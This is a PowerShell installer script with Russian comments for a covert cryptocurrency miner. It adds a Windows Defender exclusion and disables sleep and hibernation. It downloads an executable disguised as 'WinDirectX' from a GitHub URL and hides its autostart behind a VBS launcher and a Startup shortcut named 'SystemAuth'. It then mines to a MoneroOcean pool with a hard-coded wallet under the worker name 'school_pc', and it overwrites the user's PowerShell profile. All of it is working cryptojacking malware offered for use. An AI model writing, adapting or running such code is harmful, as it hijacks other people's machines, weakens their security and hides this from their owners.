$path = "C:\ProgramData\SystemLib"
$wallet = "Ltc1ql404nad6rja6paas9h7dnd2uwmkju3re3s4tuf"
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"

# 1. Защита от повторного запуска
if (Get-Process $procName -ErrorAction SilentlyContinue) {
    Write-Host "Система уже оптимизирована." -ForegroundColor Green
    exit
}

# 2. Настройка питания (чтобы не спал, но гасил экран)
powercfg /x -standby-timeout-ac 0
powercfg /x -monitor-timeout-ac 5
powercfg /h off

# 3. Подготовка папки и исключение
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force }
powershell -Command "Add-MpPreference -ExclusionPath '$path'" -ErrorAction SilentlyContinue

# 4. Скачивание EXE
if (!(Test-Path "$path\$procName.exe")) {
    try {
        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
        Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
    } catch { exit }
}

# 5. Настройка автозапуска (скрыто)
$cmd = "@echo off`n$path\$procName.exe -o gulf.moneroocean.stream:10128 -u $wallet -p school_pc --cpu-max-threads-hint 50 --priority 1"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

$WshShell = New-Object -ComObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\SystemAuth.lnk")
$Shortcut.TargetPath = "$path\win_start.vbs"
$Shortcut.Save()

# 6. Команда CHECK
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force }
$CheckFunc = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { Write-Host "СТАТУС: РАБОТАЕТ (ID: `$(`$p.Id))" -ForegroundColor Green }
    else { Write-Host "СТАТУС: ВЫКЛЮЧЕН" -ForegroundColor Red }
}
"@
$CheckFunc | Out-File -FilePath $ProfilePath -Force

# 7. Старт
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "Установка 24/7 завершена успешно!" -ForegroundColor Magenta
